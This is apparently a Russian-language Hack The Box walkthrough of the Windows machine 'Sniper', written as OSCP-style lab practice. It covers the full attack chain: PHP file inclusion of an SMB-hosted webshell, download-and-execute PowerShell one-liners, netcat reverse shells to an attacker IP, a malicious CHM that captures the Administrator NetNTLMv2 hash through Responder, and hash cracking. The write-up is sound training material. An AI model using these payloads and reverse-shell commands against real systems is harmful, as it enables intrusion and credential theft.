# Sniper (HTB)

> Платформа: Hack The Box  
> ОС: Windows  
> Сложность: Средне  
> Результат: Administrator

---

## Цепочка Атаки

```text
Разведка
+-- nmap -p- -Pn -> 80 (IIS 10.0), 135, 139, 445, 49667
|-- gobuster -> /blog/ (PHP), /user/ (login + registration)

Первичный Доступ
|-- blog/?lang=/windows/win.ini -> local file inclusion
|-- impacket-smbserver + shell.php -> remote file inclusion
|-- whoami -> nt authority\iusr
+-- type C:\inetpub\wwwroot\user\db.php -> dbuser:<PASSWORD>

Боковое Перемещение
|-- Invoke-Command LOCALHOST as SNIPER\chris (password reuse)
|-- nc.exe -e cmd.exe -> shell as sniper\chris
+-- user.txt

Повышение Привилегий
|-- C:\Docs\note.txt -> CEO expects a CHM in C:\Docs
|-- malicious instructions.chm with UNC -> Responder
|-- NetNTLMv2 SNIPER\Administrator -> hashcat 5600
|-- <PASSWORD> -> Invoke-Command as Administrator
+-- root.txt
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---
## Брифинг Машины

Windows Server 2019 с Microsoft IIS 10.0 и PHP 7.3 блогом. Блог загружает контент через GET-параметр `lang` без валидации пути - это позволяет как локальное, так и удалённое включение файлов. Удалённое включение через SMB даёт webshell в контексте `NT AUTHORITY\iUSR`. В веб-корне открыта строка подключения к MySQL (`db.php`); пароль базы данных переиспользуется локальным пользователем `chris`. От `chris` заметка в `C:\Docs` показывает, что CEO просматривает документацию в формате CHM. Это можно использовать, чтобы перехватить и взломать NetNTLMv2-хеш Administrator.

---

## Разведка

### Сканирование Портов

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.229.6
```

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
```

```bash
nmap -sC -sV -Pn -n -p80,135,139,445,49667 10.129.229.6
```

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Перечисление Директорий

```bash
gobuster dir -u http://10.129.229.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

```text
images   (Status: 301)
index.php (Status: 200)
blog     (Status: 301)
user     (Status: 301)
css      (Status: 301)
js       (Status: 301)
```

Каталог `/blog/` - это PHP-блог с GET-параметром `lang`, а `/user/` предоставляет вход и регистрацию.
---

## Первичный Доступ

No CVE (custom vulnerability) - блог включает PHP-файлы по пользовательскому пути в параметре `lang`, что позволяет локальное и удалённое включение файлов.

### Локальное Включение Файла

При смене языка блога формируется URL вида `/blog/?lang=blog-en.php`. Значение `lang` подставляется в PHP напрямую. Сборка PHP под Windows принимает абсолютные пути, поэтому последовательности обхода не нужны.

```bash
curl -s "http://10.129.229.6/blog/?lang=/windows/win.ini" | tail -12
```

```text
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Удалённое Включение Файла через SMB

Windows PHP принимает UNC-пути в `include()`. Размести webshell на SMB-шаре и подключи его напрямую с целевой машины.

```bash
mkdir -p /tmp/share
echo '<?php system($_GET["0"]); ?>' > /tmp/share/shell.php
impacket-smbserver share /tmp/share -smb2support
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=whoami" | tail -3
```

```text
nt authority\iusr
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Учётные Данные Базы Данных

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=type%20C:%5Cinetpub%5Cwwwroot%5Cuser%5Cdb.php" | tail -12
```

```text
$con = mysqli_connect("localhost","dbuser","<PASSWORD>","sniper");
```

---

## Боковое Перемещение

### Переиспользование Пароля к chris

Web shell работает от низкопривилегированной учётной записи IIS. Пароль базы данных переиспользуется локальным пользователем `chris`. WinRM снаружи закрыт, но из контекста web shell `Invoke-Command` к `LOCALHOST` всё ещё работает.

```bash
cat > /tmp/www/test-chris.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $c
EOF
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=powershell%20-c%20%22iex(New-Object%20Net.WebClient).DownloadString('http://10.10.15.129:8000/test-chris.ps1')%22" | tail -5
```

```text
sniper\chris
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Shell от chris

```bash
cat > /tmp/www/shell-chris.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock {
  iwr http://10.10.15.129:8000/nc.exe -OutFile C:\Users\chris\nc.exe
  C:\Users\chris\nc.exe -e cmd.exe 10.10.15.129 4444
} -Credential $c
EOF
```

```bash
rlwrap nc -lvnp 4444
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=powershell%20-c%20%22iex(New-Object%20Net.WebClient).DownloadString('http://10.10.15.129:8000/shell-chris.ps1')%22" | tail -3
```

```text
C:\Users\Chris\Documents>
```

Флаг пользователя находится в `C:\Users\chris\Desktop\user.txt`.
---

## Повышение Привилегий

### Перечисление от chris

```text
C:\Users\Chris\Desktop>type C:\Docs\note.txt
Hi Chris,
  Your php skillz suck. Contact yamitenshi so that he teaches you how to use it
  and after that fix the website as there are a lot of bugs on it. And I hope
  that you have prepared the documentation for our new app. Drop it here when
  you are done with it.
Regards,
Sniper CEO.
```

Заметка говорит, что CEO ожидает CHM-файл в `C:\Docs`. CHM (Compiled HTML Help) открывается через `hh.exe`, который рендерит HTML и следует UNC-ссылкам внутри - это заставляет Windows аутентифицироваться на нашей SMB-шаре.

### Сборка Вредоносного CHM

Установи Linux-компилятор CHM:

```bash
sudo apt update && sudo apt install -y fp-utils
which chmcmd
```

```text
/usr/bin/chmcmd
```

Создай HTML-исходник - тег `<img>` с UNC-путём на наш listener:

```bash
mkdir -p /tmp/chm && cat > /tmp/chm/index.html <<'EOF'
<!DOCTYPE html>
<html><body>
<h1>New App Documentation</h1>
<img src="\\10.10.15.129\share\test.png" width="1" height="1">
</body></html>
EOF
```

```bash
cat > /tmp/chm/index.hhp <<'EOF'
[OPTIONS]
Compatibility=1.1 or later
Compiled file=instructions.chm
Contents file=index.hhp
Default topic=index.html
Display compile progress=No
Language=0x409 English (United States)

[FILES]
index.html
EOF
```

```bash
cd /tmp/chm && chmcmd index.hhp && cp instructions.chm /tmp/www/
```

```text
Writing CHM instructions.chm
```

### Перехват NetNTLMv2

```bash
sudo responder -I tun0 -v
```

Сбрось CHM в `C:\Docs` из shell-а `chris`:

```text
C:\Users\Chris\Desktop>powershell -c "iwr http://10.10.15.129:8000/instructions.chm -OutFile C:\Docs\instructions.chm"
C:\Users\Chris\Desktop>dir C:\Docs\instructions.chm
```

```text
10/26/2026  08:18 PM            10,817 instructions.chm
```

Responder перехватывает хеш, когда Administrator открывает файл:

```text
[SMB] NTLMv2-SSP Client   : 10.129.229.6
[SMB] NTLMv2-SSP Username : SNIPER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::SNIPER:<NTLM_RESPONSE>:<SERVER_CHALLENGE>:<NTLM_BLOB>
```

### Взлом Хеша

```bash
hashcat -m 5600 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
```

```text
ADMINISTRATOR::SNIPER:...:<PASSWORD>
Status...........: Cracked
```

### Shell от Administrator

```bash
cat > /tmp/www/shell-admin.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\Administrator', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock {
  C:\Users\chris\nc.exe -e cmd.exe 10.10.15.129 5555
} -Credential $c
EOF
```

```bash
rlwrap nc -lvnp 5555
```

Триггерни из shell-а `chris`:

```text
C:\Users\Chris\Desktop>powershell -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.15.129:8000/shell-admin.ps1')"
```

```text
C:\Users\Administrator\Documents>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Флаги

| Флаг | Значение |
|------|----------|
| Пользователь | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

### Файл Флагов

```text
C:\Users\chris\Desktop>type C:\Users\chris\Desktop\user.txt
<USER_FLAG>
```

```text
C:\Users\Administrator\Documents>type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

---

## Ключевые Выводы

- Абсолютные пути обходят фильтры обхода в сборках PHP под Windows; проверяй `lang=/windows/win.ini` в дополнение к `../../`.
- Удалённое включение файла через SMB (`\\attacker\share\shell.php`) обычно проще отравления сессий и работает всегда, когда Windows PHP принимает UNC-пути.
- Учётные данные, найденные в исходниках веб-приложения (`db.php`), часто переиспользуются локальными учётными записями. Всегда пробуй пароль DB-пользователя против локальных пользователей.
- Слившаяся заметка или README может указывать на клиентский путь исполнения (CHM, LNK, Office). Если папка документов доступна на запись, вредоносный CHM с UNC-ссылкой перехватывает NetNTLMv2.
- NetNTLMv2 (`hashcat -m 5600`) быстро ломается по rockyou при слабом пароле. После взлома `Invoke-Command` с `PSCredential` даёт shell без открытого WinRM.
- Делай скриншот каждого этапа: `whoami` после получения доступа, после бокового перемещения и после повышения привилегий - по одному на каждый OSCP-маркер.